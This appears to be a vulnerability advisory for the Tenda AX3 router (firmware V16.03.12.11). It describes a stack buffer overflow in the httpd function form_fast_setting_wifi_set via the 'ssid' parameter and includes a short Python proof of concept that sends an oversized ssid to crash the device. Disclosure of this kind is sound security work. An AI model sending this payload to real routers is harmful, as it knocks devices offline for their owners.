Information
===========

**Vendor of the products**: Tenda <br>

**Vendor's website**: https://www.tenda.com.cn <br>

**Reported by**: korey0sh1(korey0sh2@gmail.com) <br>

**Affected products**: Tenda AX3 <br>

**Affected firmware version**: V16.03.12.11 <br>

**Firmware download address**: https://www.tenda.com.cn/download/detail-3476.html <br>

Overview
===========

**Tenda AX3 V16.03.12.11** has a **stack buffer overflow** vulnerability detected at function **form_fast_setting_wifi_set**. This vulnerability allows attackers to cause a Denial of Service (DoS) via the devName parameter **ssid**. <br>

Vulnerability details
=====================
The vulnerability is detected at **/bin/httpd** <br>

In the function **form_fast_setting_wifi_set**, the content obtained by program through parameter **ssid** given by http is passed to variable **v5**. Then, the variable **v5** is equal to the variable **v6**, and the content of **ssid** will be copyed to the variable **par**.However,**par** is on the stack,but there isn't any length check of **v6**.. <br>
![](https://github.com/Korey0sh1/IoT_vuln/blob/main/Tenda/AX3/img/0.png) <br>

<br>

Proof of Code
====================
```python
from pwn import *
import requests

url = "http://192.168.0.1/goform/fast_setting_wifi_set"

payload = "a"*0x1000
data = {
    "ssid": payload,
}
res = requests.post(url=url,data=data)
print(res.text)
```


Attack Demo
========
<br>


